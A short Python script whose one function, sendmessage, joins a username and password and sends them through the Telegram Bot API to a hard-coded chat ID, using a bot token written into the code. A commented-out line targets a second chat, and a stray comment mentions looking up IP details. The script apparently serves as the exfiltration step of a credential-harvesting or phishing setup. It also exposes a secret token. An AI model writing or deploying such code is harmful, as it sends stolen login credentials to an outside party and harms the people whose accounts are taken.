import requests as r
import json



def sendmessage(username,password):
    message=username+"\n"+password
    chatid  = "1752255540"
    base_url = "https://api.telegram.org/bot6776351288:AAGw4_TCTHdUzPXOF-35hDapyDHfL05TDwM/SendMessage?chat_id={}&text={}".format(chatid,message)
    # base_url1 = "https://api.telegram.org/bot6776351288:AAGw4_TCTHdUzPXOF-35hDapyDHfL05TDwM/SendMessage?chat_id={}&text={}&disable_web_page_preview=true&parse_mode=Markdown".format("1821113184",message)
    response = r.get(base_url)
    # response1 = r.get(base_url1)
    print(response.text)
    if json.loads(response.text)["ok"] == True:
        return True
    return False


    
if __name__ == "__main__":
    # print(sendmessage(-1001811887121,"*hii*"))
    # getipdetails("47.11.200.15")
    sendmessage("username_fdas","password")
    pass
